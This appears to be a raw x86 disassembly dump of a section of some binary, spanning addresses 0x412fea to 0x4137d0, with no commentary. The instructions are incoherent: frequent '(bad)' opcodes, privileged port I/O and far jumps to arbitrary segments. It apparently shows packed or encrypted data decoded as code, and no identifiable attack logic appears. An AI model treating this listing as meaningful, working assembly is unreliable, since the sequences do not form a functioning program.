  412fea:	lods   eax,DWORD PTR ds:[esi]
  412feb:	outs   dx,BYTE PTR ds:[esi]
  412fec:	xor    BYTE PTR [ebp-0x18],dl
  412fef:	repz mov ebx,0x811a681f
  412ff5:	int    0xba
  412ff7:	pop    esp
  412ff8:	fwait
  412ff9:	mov    ds:0x83ccb83d,al
  412ffe:	lea    ebp,[eax-0x1f]
  413001:	fiadd  WORD PTR [esi-0x3944762a]
  413007:	dec    ecx
  413008:	sbb    BYTE PTR [edx+esi*8+0x56],al
  41300c:	and    dh,BYTE PTR [edx-0xffb277a]
  413012:	jmp    0x413019
  413014:	dec    edx
  413015:	icebp  
  413016:	dec    eax
  413017:	xchg   ebp,eax
  413018:	icebp  
  413019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41301a:	jecxz  0x412fd7
  41301c:	jecxz  0x41307d
  41301e:	sbb    BYTE PTR [eax+0xa475ce1],al
  413024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413025:	add    BYTE PTR [edx-0x497b0912],al
  41302b:	add    bl,BYTE PTR [ebp-0x53]
  41302e:	and    dl,BYTE PTR [edx-0x5a242908]
  413034:	pop    edi
  413035:	bound  ebx,QWORD PTR [ebx+0x76]
  413038:	or     al,0xa3
  41303a:	stos   DWORD PTR es:[edi],eax
  41303b:	fistp  WORD PTR [ecx+0x12]
  41303e:	das    
  41303f:	in     al,0x28
  413041:	les    ebp,FWORD PTR [eax+0x440792b]
  413047:	dec    ebx
  413048:	loopne 0x412fcb
  41304a:	bound  esi,QWORD PTR [edx]
  41304c:	mov    BYTE PTR [ebx-0x80],al
  41304f:	pop    edx
  413050:	jmp    0x2015b5a3
  413055:	cmp    DWORD PTR [edx+0x41],esp
  413058:	cmp    eax,0xe5a11cdb
  41305d:	mov    dl,0xb4
  41305f:	scas   eax,DWORD PTR es:[edi]
  413060:	test   DWORD PTR [ecx-0x31c0deb2],edx
  413066:	dec    edx
  413067:	ror    BYTE PTR gs:[eax+0x4ee292de],0x29
  41306f:	xchg   edi,eax
  413070:	xacquire xchg BYTE PTR [ebx],ch
  413073:	mov    esi,0x20eb0e5
  413078:	and    al,0xe2
  41307a:	ror    dh,cl
  41307c:	jo     0x413070
  41307e:	pop    edx
  41307f:	in     eax,0xb5
  413081:	cld    
  413082:	lods   al,BYTE PTR ds:[esi]
  413083:	add    ch,BYTE PTR [edx-0xc]
  413086:	jge    0x4130b7
  413088:	es pop eax
  41308a:	ins    DWORD PTR es:[edi],dx
  41308b:	inc    ebx
  41308c:	dec    ebp
  41308d:	fsub   DWORD PTR [edi]
  41308f:	cmp    ebp,DWORD PTR [edi]
  413091:	std    
  413092:	add    eax,DWORD PTR [edi-0x70]
  413095:	lock mov ch,0xcb
  413098:	(bad)  
  413099:	mov    esp,0x5b37b907
  41309e:	std    
  41309f:	in     al,dx
  4130a0:	int3   
  4130a1:	sbb    eax,0xbef8c048
  4130a6:	fwait
  4130a7:	jmp    0x2048:0x64a0c54a
  4130ae:	mov    esi,0x78b725b8
  4130b3:	cmp    dl,BYTE PTR [edi]
  4130b5:	fs mov bl,dh
  4130b8:	and    BYTE PTR [edx],cl
  4130ba:	pop    edx
  4130bb:	les    esi,FWORD PTR [esi-0xd5de844]
  4130c1:	jl     0x41307c
  4130c3:	lds    esi,FWORD PTR [esi]
  4130c5:	lods   al,BYTE PTR ds:[esi]
  4130c6:	int    0x4
  4130c8:	sar    edx,1
  4130ca:	stos   BYTE PTR es:[edi],al
  4130cb:	pop    ecx
  4130cc:	(bad)  
  4130cd:	out    dx,al
  4130ce:	push   ds
  4130cf:	scas   al,BYTE PTR es:[edi]
  4130d0:	jg     0x4130aa
  4130d2:	clc    
  4130d3:	pop    edi
  4130d4:	xor    ah,al
  4130d6:	in     eax,0xfb
  4130d8:	pop    esp
  4130d9:	mov    al,ds:0xe9c33dec
  4130de:	mov    al,ds:0xad638eed
  4130e3:	jne    0x4130a7
  4130e5:	test   ebx,0xc77e1e9f
  4130eb:	fsubrp st(4),st
  4130ed:	clc    
  4130ee:	dec    edx
  4130ef:	sbb    bh,dl
  4130f1:	inc    eax
  4130f2:	fs inc eax
  4130f4:	jle    0x413138
  4130f6:	std    
  4130f7:	(bad)  
  4130f8:	aas    
  4130f9:	adc    DWORD PTR [bp+di-0x3c23],esp
  4130fe:	sub    BYTE PTR [edx],bl
  413100:	mov    ds:0x627c1868,al
  413105:	fs retf 
  413107:	add    eax,0x32a4ce56
  41310c:	fnstsw WORD PTR [ebp-0x36]
  41310f:	jl     0x413094
  413111:	xchg   edx,eax
  413112:	mov    bh,0x4
  413114:	mov    esp,0xd5122709
  413119:	pop    ecx
  41311a:	sti    
  41311b:	retf   
  41311c:	call   0x2878:0xbd38b069
  413123:	dec    ebx
  413124:	xchg   DWORD PTR [ebx],ecx
  413126:	jmp    0x413150
  413128:	pop    es
  413129:	sbb    cl,BYTE PTR [esi-0x47]
  41312c:	stos   DWORD PTR es:[edi],eax
  41312d:	pop    ebx
  41312e:	repz sar ebp,0x96
  413132:	(bad)  
  413134:	scas   eax,DWORD PTR es:[edi]
  413135:	rcr    DWORD PTR [ebp-0x75],1
  413138:	ficomp WORD PTR [ebp+0x32]
  41313b:	js     0x413149
  41313d:	sub    cl,BYTE PTR [esi-0x32]
  413140:	push   edi
  413141:	xor    BYTE PTR ds:0x160d0f9a,0x94
  413148:	mov    DWORD PTR [esi-0x57],0xfed728b0
  41314f:	fidiv  DWORD PTR [edi+edi*2-0x2125719c]
  413156:	int3   
  413157:	stc    
  413158:	pop    edi
  413159:	jno    0x413132
  41315b:	add    eax,0x98fca8c1
  413160:	rcl    eax,cl
  413162:	dec    edi
  413163:	add    BYTE PTR [ebp+0x23d3eff3],cl
  413169:	into   
  41316a:	jo     0x413102
  41316c:	cli    
  41316d:	xchg   ebx,eax
  41316e:	dec    esi
  41316f:	xchg   ebx,eax
  413170:	dec    ebp
  413171:	sub    ah,BYTE PTR [eax-0x59a29d44]
  413177:	gs mov cl,0x6b
  41317a:	test   eax,esp
  41317c:	cwde   
  41317d:	sti    
  41317e:	arpl   WORD PTR [esi-0x7e],dx
  413181:	stos   DWORD PTR es:[edi],eax
  413182:	sahf   
  413183:	push   edx
  413184:	cmp    al,0xb3
  413186:	loop   0x4131be
  413188:	dec    ebx
  413189:	xlat   BYTE PTR ds:[ebx]
  41318a:	push   ecx
  41318b:	mov    edi,0xfce1e08a
  413190:	pop    es
  413191:	mov    bl,0x7
  413193:	or     ecx,esi
  413195:	fwait
  413196:	xchg   edi,eax
  413197:	mov    edx,0xf2835ba5
  41319c:	or     esp,DWORD PTR ds:0x8f62c252
  4131a2:	stos   BYTE PTR es:[edi],al
  4131a3:	out    dx,al
  4131a4:	push   ebx
  4131a5:	in     eax,0x6f
  4131a7:	sub    edx,esp
  4131a9:	sub    DWORD PTR [ebx-0x8],ebp
  4131ac:	lods   eax,DWORD PTR ds:[esi]
  4131ad:	lds    eax,FWORD PTR [ebp+eax*8+0x5b]
  4131b1:	fstp   DWORD PTR [esp+ebp*1]
  4131b4:	(bad)  
  4131b5:	(bad)  
  4131b6:	inc    esp
  4131b7:	dec    ecx
  4131b8:	ret    0xac4d
  4131bb:	push   0x4
  4131bd:	xchg   edx,eax
  4131be:	mov    ebx,0xc33ecc45
  4131c3:	loop   0x4131e4
  4131c5:	dec    eax
  4131c6:	fs hlt 
  4131c8:	arpl   WORD PTR [ebx+0x5c],sp
  4131cb:	xchg   esi,eax
  4131cc:	inc    ecx
  4131cd:	scas   ax,WORD PTR es:[edi]
  4131cf:	push   ds
  4131d0:	fcom   DWORD PTR [eax]
  4131d2:	lods   al,BYTE PTR ds:[esi]
  4131d3:	pop    ss
  4131d4:	lods   eax,DWORD PTR ds:[esi]
  4131d5:	inc    ebx
  4131d6:	adc    BYTE PTR [ebp+ecx*8-0x2f],ah
  4131da:	ja     0x4131d8
  4131dc:	rcl    DWORD PTR [eax],0xd1
  4131df:	(bad)  
  4131e0:	sub    eax,0x903fa4f5
  4131e5:	je     0x4131ee
  4131e7:	pop    ebp
  4131e8:	aas    
  4131e9:	inc    ebx
  4131ea:	adc    edi,DWORD PTR [ecx+0x7ee0b0a0]
  4131f0:	test   al,0xdb
  4131f2:	mov    al,0x45
  4131f4:	clc    
  4131f5:	dec    ebx
  4131f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131f7:	or     BYTE PTR [esi+0x79d09fec],0x3f
  4131fe:	lahf   
  4131ff:	in     al,dx
  413200:	das    
  413201:	and    BYTE PTR [eax+0x1d92ac34],bl
  413207:	(bad)  
  413209:	or     edi,DWORD PTR [ebx+0x1c]
  41320c:	cmp    edx,eax
  41320e:	inc    esi
  41320f:	jl     0x4131ff
  413211:	and    al,0x2
  413213:	sbb    DWORD PTR [esi],ecx
  413215:	leave  
  413216:	xchg   esp,eax
  413217:	xor    BYTE PTR [edx-0xfcc19f],0x2c
  41321e:	add    DWORD PTR [ebx],edi
  413220:	add    eax,DWORD PTR [ecx]
  413222:	lock mov BYTE PTR ds:0x2c63375e,bl
  413229:	push   cs
  41322a:	(bad)  [esi]
  41322c:	je     0x41320a
  41322e:	mov    ds:0xb266ff10,al
  413233:	and    eax,0xb159df10
  413238:	and    eax,0x7e0ef82
  41323d:	enter  0x3bca,0x9a
  413241:	xor    eax,DWORD PTR [esi+0x4dcc92bc]
  413247:	mov    ds:0xeb40ca41,eax
  41324c:	pop    ebp
  41324e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41324f:	aas    
  413250:	push   es
  413251:	push   ds
  413252:	(bad)  
  413253:	daa    
  413254:	push   ecx
  413255:	je     0x4131ee
  413257:	and    bh,dl
  413259:	icebp  
  41325a:	pushf  
  41325b:	jne    0x4132bb
  41325d:	adc    BYTE PTR [edx-0x4b],ah
  413260:	push   ds
  413261:	fcmovne st,st(5)
  413263:	push   edx
  413264:	adc    esp,DWORD PTR [eax-0x31]
  413267:	pop    ss
  413268:	mov    al,0x38
  41326a:	xchg   ebx,eax
  41326b:	pusha  
  41326c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41326d:	xor    cl,BYTE PTR [esp+edx*4+0x79671374]
  413274:	cli    
  413275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413276:	add    eax,0x7131f797
  41327b:	xchg   DWORD PTR [ecx],edx
  41327d:	jg     0x413247
  41327f:	sahf   
  413280:	sahf   
  413281:	lods   al,BYTE PTR ds:[esi]
  413282:	push   ebx
  413283:	stos   DWORD PTR es:[edi],eax
  413284:	push   esp
  413285:	push   es
  413286:	and    BYTE PTR [ecx-0x399cb03d],dh
  41328c:	dec    edi
  41328d:	push   cs
  41328e:	sub    BYTE PTR [edx+0x37a24c11],0x21
  413295:	jae    0x4132ad
  413297:	cmc    
  413298:	pop    edx
  413299:	out    0xaa,al
  41329b:	(bad)
  41329e:	adc    al,BYTE PTR [ecx-0x42]
  4132a1:	xor    BYTE PTR [edx-0x286179dc],dl
  4132a7:	cmp    DWORD PTR [ebx-0x19],eax
  4132aa:	repnz push ebp
  4132ac:	mov    esi,0x5c294e0e
  4132b1:	add    eax,0xcecb4ef7
  4132b6:	lea    ebp,[edx]
  4132b8:	lea    esp,[edx+0x3eeeaeae]
  4132be:	sbb    dh,BYTE PTR [ecx-0x712d7220]
  4132c4:	lahf   
  4132c5:	dec    ebp
  4132c6:	jmp    0x61af8632
  4132cb:	jo     0x4132db
  4132cd:	adc    al,0xed
  4132cf:	fwait
  4132d0:	rol    BYTE PTR [esp+ebx*4-0x614bf50d],cl
  4132d7:	sub    DWORD PTR [esi+0x3de2c41b],ebp
  4132dd:	loope  0x413312
  4132df:	or     al,bh
  4132e1:	fadd   QWORD PTR [edi]
  4132e3:	mov    bh,0x15
  4132e5:	aam    0x0
  4132e7:	inc    esp
  4132e8:	push   esp
  4132e9:	pop    ecx
  4132ea:	mov    gs,WORD PTR [esp+edx*8-0x5db77da]
  4132f1:	daa    
  4132f2:	inc    esp
  4132f3:	mov    esp,0x1b3f7269
  4132f8:	out    0x59,eax
  4132fa:	sbb    ebx,edi
  4132fc:	cmp    bl,BYTE PTR [edx-0x697fd9c3]
  413302:	shr    edx,1
  413304:	inc    ebp
  413305:	inc    edi
  413306:	sub    eax,0xc5ccf664
  41330b:	into   
  41330c:	test   eax,0x294741cf
  413311:	sar    dh,cl
  413313:	jno    0x41332b
  413315:	inc    ecx
  413316:	sub    DWORD PTR [edi+0xf],ebp
  413319:	inc    ebx
  41331a:	shl    BYTE PTR [edi+0x42e4fc99],0x5a
  413321:	xor    esp,DWORD PTR [ecx-0x7e]
  413324:	stos   BYTE PTR es:[edi],al
  413325:	push   esi
  413326:	test   al,0xd4
  413328:	test   eax,0x7b901986
  41332d:	call   0x2a0737e4
  413332:	leave  
  413333:	add    dl,bh
  413335:	pop    edi
  413336:	lods   eax,DWORD PTR ds:[esi]
  413337:	or     DWORD PTR [edi+0x6f],ebx
  41333a:	mov    al,fs:0x5fdfde3c
  413340:	repnz inc eax
  413342:	cmp    ebp,DWORD PTR [ebx]
  413344:	xor    DWORD PTR [eax-0x2f2b3645],edx
  41334a:	in     eax,dx
  41334b:	shl    ah,cl
  41334d:	arpl   WORD PTR [edx+0x53002bfe],si
  413353:	push   esp
  413354:	aam    0x87
  413356:	xchg   edi,eax
  413357:	push   esp
  413358:	loop   0x41339f
  41335a:	xor    al,0x5b
  41335c:	jecxz  0x413325
  41335e:	and    bh,BYTE PTR [edx+0x580c5fad]
  413364:	xchg   DWORD PTR [ebx+ecx*8+0x37b4df4a],ecx
  41336b:	cmp    al,0xfb
  41336d:	call   0x9d02:0x1c154c90
  413374:	and    esi,ebp
  413376:	jbe    0x413303
  413378:	mov    eax,0x3ebff229
  41337d:	adc    edi,DWORD PTR [eax-0x3f]
  413380:	and    eax,0x81cb9311
  413385:	enter  0x898b,0xc4
  413389:	aad    0xeb
  41338b:	inc    edx
  41338c:	inc    ebx
  41338d:	fiadd  WORD PTR [ebx-0x21e0f8a1]
  413393:	rcr    DWORD PTR [esp+ebx*8+0x1b],cl
  413397:	xchg   cl,bh
  413399:	mov    ch,0x6a
  41339b:	outs   dx,BYTE PTR ds:[esi]
  41339c:	into   
  41339d:	fsub   QWORD PTR [edx]
  41339f:	jp     0x4133a6
  4133a1:	pop    eax
  4133a2:	push   edi
  4133a3:	jnp    0x41334e
  4133a5:	out    dx,eax
  4133a6:	sbb    DWORD PTR [edx+0x462f6154],ebp
  4133ac:	ja     0x4133c5
  4133ae:	xchg   esi,eax
  4133af:	xchg   DWORD PTR [edi-0x80],ebp
  4133b2:	lock pusha 
  4133b4:	out    dx,eax
  4133b5:	fmul   QWORD PTR [edx-0x28]
  4133b8:	aam    0x1a
  4133ba:	inc    esp
  4133bb:	jg     0x4133c2
  4133bd:	iret   
  4133be:	push   eax
  4133bf:	leave  
  4133c0:	ret    0xc528
  4133c3:	loop   0x4133bc
  4133c5:	mov    al,BYTE PTR [ecx-0xbfcc3dd]
  4133cb:	jo     0x4133dd
  4133cd:	clc    
  4133ce:	xor    dl,cl
  4133d0:	sub    BYTE PTR [ecx],0xd7
  4133d3:	dec    esp
  4133d4:	fbld   TBYTE PTR [ebx+0x764c274a]
  4133da:	ror    ecx,0x31
  4133dd:	es adc al,0x4f
  4133e0:	clc    
  4133e1:	loopne 0x413417
  4133e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133e4:	sbb    DWORD PTR [eax-0x56],0x309b30b6
  4133eb:	in     eax,dx
  4133ec:	jl     0x413413
  4133ee:	push   ebp
  4133ef:	inc    edx
  4133f0:	lds    esp,FWORD PTR [esi-0x7b27822e]
  4133f6:	(bad)  [esi+0x7b863487]
  4133fc:	pop    eax
  4133fd:	lahf   
  4133fe:	dec    eax
  4133ff:	and    ch,BYTE PTR [ebx-0x3ba0458e]
  413405:	arpl   dx,bx
  413407:	adc    bh,BYTE PTR [eax+0x4970a44b]
  41340d:	sbb    eax,0x7f732a1f
  413412:	fist   WORD PTR [edi+0x3c4c8cf9]
  413418:	int3   
  413419:	dec    ecx
  41341a:	pop    eax
  41341b:	xchg   esi,eax
  41341c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41341d:	mov    bh,0x23
  41341f:	add    eax,0x4749fb3d
  413424:	add    al,0xbc
  413426:	mov    ch,BYTE PTR [edx+0x55940a02]
  41342c:	inc    esi
  41342d:	idiv   DWORD PTR [ecx-0x3e]
  413430:	fnstsw WORD PTR [ecx*4-0x213d6697]
  413437:	pop    ebx
  413438:	ret    0xe876
  41343b:	mov    DWORD PTR [ebx-0x4e],edi
  41343e:	sbb    BYTE PTR [eax+0x53],ch
  413441:	sbb    DWORD PTR [ebx+eiz*2-0x78],ecx
  413445:	inc    ebx
  413446:	mov    ecx,0x479b78fa
  41344b:	jl     0x413463
  41344d:	pop    ds
  41344e:	sahf   
  41344f:	popf   
  413450:	or     BYTE PTR [ebx],dh
  413452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413453:	mov    ss,WORD PTR [ebp+0x2d]
  413456:	out    dx,al
  413457:	rcl    BYTE PTR [edx-0x143b087b],1
  41345d:	mov    WORD PTR [edx-0x74261572],ss
  413463:	xor    edi,ebx
  413465:	lods   al,BYTE PTR ds:[esi]
  413466:	sub    eax,0xdf805055
  41346b:	mov    ebp,0xbb2e17d7
  413470:	xchg   esi,eax
  413471:	cmp    al,0xd6
  413473:	pop    ecx
  413474:	fucom  st(0)
  413476:	push   edx
  413477:	popa   
  413478:	push   ds
  413479:	mov    dl,0x67
  41347b:	(bad)  [ecx+esi*8]
  41347e:	shl    esp,0x2b
  413481:	loopne 0x4134ea
  413483:	jnp    0x4134d4
  413485:	gs call 0x4adf:0xe218ee47
  41348d:	rcl    BYTE PTR ds:0x8e180513,0x6c
  413494:	imul   edx,DWORD PTR [ebp-0x2a60a7f1],0x50
  41349b:	lock inc edx
  41349d:	dec    BYTE PTR [esi]
  41349f:	adc    BYTE PTR [eax],bh
  4134a1:	aam    0x2
  4134a3:	xchg   edx,eax
  4134a4:	(bad)  [edx+0x47]
  4134a7:	lds    ebp,FWORD PTR [ecx+0x3ee40bb]
  4134ad:	push   0x58ac5a9d
  4134b2:	test   dh,dh
  4134b4:	and    eax,0x43b64bef
  4134b9:	ret    
  4134ba:	xchg   DWORD PTR [esi],edi
  4134bc:	mov    ds:0xe4e2c0c7,al
  4134c1:	xchg   esi,eax
  4134c2:	or     BYTE PTR [edi-0x38],bh
  4134c5:	hlt    
  4134c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134c7:	enter  0x9d51,0xdc
  4134cb:	or     esp,ebx
  4134cd:	push   esp
  4134ce:	and    cl,dh
  4134d0:	sub    BYTE PTR [ebx],bh
  4134d2:	sub    bl,bl
  4134d4:	js     0x4134a2
  4134d6:	jg     0x413485
  4134d8:	ficom  WORD PTR [eax+0x59]
  4134db:	jmp    0xa0013cea
  4134e0:	les    edx,FWORD PTR [edx-0x3190512]
  4134e6:	mov    ebp,0xef71091d
  4134eb:	xor    al,0x25
  4134ed:	cmp    eax,0x141d14d2
  4134f2:	imul   ecx,DWORD PTR [edi+0x31ef10f5],0xffffffe8
  4134f9:	(bad)  
  4134fa:	js     0x413481
  4134fc:	(bad)  
  4134fd:	and    dh,bl
  4134ff:	sub    BYTE PTR [ecx+0x7fa1f224],dl
  413505:	jb     0x413558
  413507:	loope  0x4134ba
  413509:	push   edi
  41350a:	pusha  
  41350b:	(bad)  
  41350c:	lea    ecx,[edx]
  41350e:	dec    ecx
  41350f:	neg    BYTE PTR [bx-0x4f70]
  413514:	xor    eax,0x5b5de344
  413519:	pop    ebp
  41351a:	dec    ebx
  41351b:	sub    eax,0x298a6535
  413520:	push   0x62
  413522:	or     eax,0xe2db1c13
  413527:	loop   0x413520
  413529:	push   ecx
  41352a:	inc    esp
  41352b:	xchg   ebp,eax
  41352c:	das    
  41352d:	je     0x41354c
  41352f:	and    dl,BYTE PTR ds:0x613a3130
  413535:	sbb    ecx,eax
  413537:	mov    ah,0xc6
  413539:	(bad)  
  41353b:	jle    0x4134ea
  41353d:	cmp    BYTE PTR [esi],bl
  41353f:	xor    DWORD PTR [eax-0x9],0xa2e1e184
  413546:	lods   al,BYTE PTR ss:[esi]
  413548:	rol    ebp,cl
  41354a:	aam    0x20
  41354c:	cmp    esp,eax
  41354e:	pop    ebp
  41354f:	inc    ecx
  413550:	imul   ebp,DWORD PTR [edi+0x72],0x7c
  413554:	xchg   BYTE PTR [ecx],bl
  413556:	rcl    BYTE PTR [edi-0x1dd7da80],cl
  41355c:	xchg   DWORD PTR [eax],ecx
  41355e:	jbe    0x413551
  413560:	ret    0x5ea8
  413563:	mov    bl,0x58
  413565:	xchg   bl,dl
  413567:	cli    
  413568:	pop    ecx
  413569:	pop    esi
  41356a:	int    0xbb
  41356c:	xchg   edx,eax
  41356d:	call   0xe67b533f
  413572:	push   esi
  413573:	fdiv   QWORD PTR [ebp+0x4d]
  413576:	int    0x2d
  413578:	sub    al,BYTE PTR [esp+ebx*4-0x2d]
  41357c:	xor    eax,0xf623f0bc
  413581:	rcl    eax,0xe8
  413584:	mul    DWORD PTR [eax+edi*4+0x1]
  413588:	mov    esi,0x3b9e7681
  41358d:	cdq    
  41358e:	(bad)  
  41358f:	in     al,0x5c
  413591:	fldcw  WORD PTR [eax+0x32]
  413594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413595:	pop    es
  413596:	push   0x17
  413598:	leave  
  413599:	or     BYTE PTR ds:0xa51b74a1,cl
  41359f:	mov    cl,0x39
  4135a1:	loopne 0x4135cc
  4135a3:	mov    edx,0xcd676d68
  4135a8:	mov    al,ds:0xff984592
  4135ad:	gs loope 0x413546
  4135b0:	mov    ds,ebx
  4135b2:	xchg   esi,eax
  4135b3:	and    eax,0x332d229
  4135b8:	push   ecx
  4135b9:	cli    
  4135ba:	mov    dl,0x11
  4135bc:	sbb    ecx,edx
  4135be:	jbe    0x413610
  4135c0:	sub    dl,al
  4135c2:	pop    eax
  4135c3:	mov    ?,WORD PTR [eax-0x7de163e5]
  4135c9:	lds    edx,FWORD PTR [esi]
  4135cb:	inc    eax
  4135cc:	or     al,0x9e
  4135ce:	adc    dh,al
  4135d0:	sbb    ch,bh
  4135d2:	add    dl,BYTE PTR [edx]
  4135d4:	out    0x4a,al
  4135d6:	cld    
  4135d7:	and    DWORD PTR [ebx+0x6facfc4d],ebx
  4135dd:	cmp    BYTE PTR [ecx],ch
  4135df:	mov    edx,0x53d684c7
  4135e4:	mov    edi,0xf9f98cb7
  4135e9:	nop
  4135ea:	les    esi,FWORD PTR [eax+0x17]
  4135ed:	loop   0x413658
  4135ef:	out    dx,eax
  4135f0:	aam    0x87
  4135f2:	jl     0x413617
  4135f4:	pop    edx
  4135f5:	aam    0x9b
  4135f7:	add    DWORD PTR [esi-0x657e56d0],esp
  4135fd:	retf   
  4135fe:	xchg   ebx,ebp
  413600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413601:	es ss mov ah,0xc9
  413605:	not    DWORD PTR [eax-0x73]
  413608:	fwait
  413609:	dec    eax
  41360a:	push   cs
  41360b:	call   0x5d4d:0xaa2143d
  413612:	push   esi
  413613:	adc    BYTE PTR [esp+edi*4],bl
  413616:	dec    edx
  413617:	mov    bl,al
  413619:	lds    ecx,FWORD PTR [edi]
  41361b:	imul   esi,DWORD PTR [ebx-0x56],0xffffffa3
  41361f:	mov    ecx,esi
  413621:	sahf   
  413622:	adc    al,0xc7
  413624:	in     al,dx
  413625:	fwait
  413626:	mov    dl,0xc9
  413628:	int    0x17
  41362a:	mov    dh,0xde
  41362c:	inc    ecx
  41362d:	pop    edi
  41362e:	sbb    BYTE PTR [eax+ebx*4+0x63],bh
  413632:	xchg   ebp,eax
  413633:	popa   
  413634:	push   edx
  413635:	leave  
  413636:	fimul  WORD PTR [ebx+0x2d]
  413639:	lea    ebx,[edi-0x3f]
  41363c:	aas    
  41363d:	in     eax,dx
  41363e:	xor    al,0xca
  413641:	dec    esi
  413642:	cld    
  413643:	xor    BYTE PTR [eax-0x76],dl
  413646:	jecxz  0x413674
  413648:	xchg   eax,edi
  41364a:	or     DWORD PTR [eax+0x4d],ecx
  41364d:	sub    eax,0xe576deee
  413652:	jge    0x41367d
  413654:	out    dx,al
  413655:	add    eax,0xb4121f5b
  41365a:	out    0xce,eax
  41365c:	mov    ?,WORD PTR [edi+0x3f7e80e2]
  413662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413663:	jg     0x413625
  413665:	adc    cl,dh
  413667:	ret    
  413668:	mov    edi,0xc6798363
  41366d:	pushf  
  41366e:	fist   WORD PTR [edx-0x261d9f0d]
  413674:	mov    al,BYTE PTR [edx-0x62b38e55]
  41367a:	cmp    DWORD PTR [esi],eax
  41367c:	mov    edi,0xfd53270
  413681:	retf   
  413682:	leave  
  413683:	sub    edx,0xed383605
  413689:	add    DWORD PTR [eax],ecx
  41368b:	and    DWORD PTR [eax-0x61],ebp
  41368e:	rcr    BYTE PTR [edi],1
  413690:	mov    dh,0xc1
  413692:	hlt    
  413693:	rcl    DWORD PTR [edx],cl
  413695:	dec    esp
  413696:	adc    DWORD PTR [ecx],0xffffff80
  413699:	mov    cl,BYTE PTR [eax-0x632298a2]
  41369f:	push   ss
  4136a0:	or     BYTE PTR [edi+ecx*1+0x7a],dl
  4136a4:	inc    ecx
  4136a5:	mov    bh,0x2f
  4136a7:	int    0x75
  4136a9:	outs   dx,DWORD PTR ds:[esi]
  4136aa:	aaa    
  4136ab:	push   eax
  4136ac:	inc    esi
  4136ad:	lods   ax,WORD PTR ds:[esi]
  4136af:	or     esp,DWORD PTR [ebx+edi*8+0x269599a0]
  4136b6:	lock or ah,al
  4136b9:	mov    dl,0x1e
  4136bb:	pmovmskb eax,mm6
  4136be:	jmp    0x7f5a:0xe15bc82e
  4136c5:	fsub   QWORD PTR [edi+0x2a103d8e]
  4136cb:	(bad)  
  4136cc:	ins    BYTE PTR es:[edi],dx
  4136cd:	add    ah,BYTE PTR [ebx]
  4136cf:	add    BYTE PTR [ebp+0x2a528346],bh
  4136d5:	aaa    
  4136d6:	rol    BYTE PTR [ecx-0x35583f4c],1
  4136dc:	push   edx
  4136dd:	fild   QWORD PTR [edi+0x3f]
  4136e0:	mov    bl,0x84
  4136e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136e3:	ficom  WORD PTR [edi]
  4136e5:	data16 cmp BYTE PTR [esi+edx*2+0x77],dl
  4136ea:	out    0x3f,al
  4136ec:	test   BYTE PTR [edi+0x34da85c1],bh
  4136f2:	rcl    DWORD PTR [ebx+0x6e],1
  4136f5:	pop    ss
  4136f6:	and    al,0x2b
  4136f8:	popf   
  4136f9:	xchg   BYTE PTR [eax+0x2f],al
  4136fc:	ror    BYTE PTR [esi],1
  4136fe:	mov    dh,0xd9
  413700:	iret   
  413701:	cs push es
  413703:	paddsb mm0,QWORD PTR [ebx]
  413706:	jmp    0xfa25:0x21901eb9
  41370d:	iret   
  41370e:	jmp    FWORD PTR [ebx]
  413710:	je     0x413758
  413712:	push   0xaf7c024d
  413717:	inc    esp
  413718:	push   0xb6d4457f
  41371d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41371e:	imul   ebx,DWORD PTR [ebx+0x54b4acd8],0x5d95bce7
  413728:	ss into 
  41372a:	test   al,0xe9
  41372c:	push   edx
  41372d:	push   esi
  41372e:	out    dx,eax
  41372f:	test   BYTE PTR [esi-0x3],al
  413732:	mov    ebp,0x8db21e03
  413737:	scas   eax,DWORD PTR es:[edi]
  413738:	idiv   DWORD PTR [ecx+edi*2-0x7ba87145]
  41373f:	into   
  413740:	jmp    0x4236:0xc98f580e
  413747:	jle    0x4137c3
  413749:	sub    edi,esp
  41374b:	add    eax,0xfef4b92d
  413750:	into   
  413751:	fild   DWORD PTR [ebp-0x7b]
  413754:	les    esp,FWORD PTR es:[eax+0x61289131]
  41375b:	test   DWORD PTR [ebp-0x74fd9ae6],ebx
  413761:	adc    ebp,DWORD PTR [ebp+0x68]
  413764:	sub    ebx,esp
  413766:	xchg   esp,eax
  413767:	imul   edx,DWORD PTR [esi],0x8e9a6b78
  41376d:	call   0xa114c9b0
  413772:	jecxz  0x4136fe
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	xchg   bl,bl
  413777:	jmp    0x775a73eb
  41377c:	js     0x4137c5
  41377e:	test   ecx,ebx
  413780:	or     ebx,ecx
  413782:	xchg   edi,eax
  413783:	jb     0x4137e0
  413785:	xchg   ecx,eax
  413786:	pop    ecx
  413787:	pop    ds
  413788:	inc    eax
  413789:	jns    0x413804
  41378b:	adc    DWORD PTR [edx+0x43],0x6a35d7fe
  413792:	lds    esi,FWORD PTR [ebp+eiz*8+0x79]
  413796:	mov    ecx,0x7faea43b
  41379b:	or     eax,0x56058586
  4137a0:	dec    ecx
  4137a1:	data16 push di
  4137a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137a6:	test   al,0xca
  4137a8:	dec    esp
  4137a9:	xor    DWORD PTR [edi+0x39],ebp
  4137ac:	and    eax,0xb49dc27a
  4137b1:	mov    ah,0x6e
  4137b3:	sahf   
  4137b4:	jecxz  0x413835
  4137b6:	jnp    0x413803
  4137b8:	imul   esp,DWORD PTR [ecx],0xcd081c75
  4137be:	push   ebp
  4137bf:	in     eax,0x25
  4137c1:	call   0xe050:0xefab1f38
  4137c8:	ror    BYTE PTR [esi-0x1eb6cf0c],cl
  4137ce:	mov    ch,0x2c
  4137d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
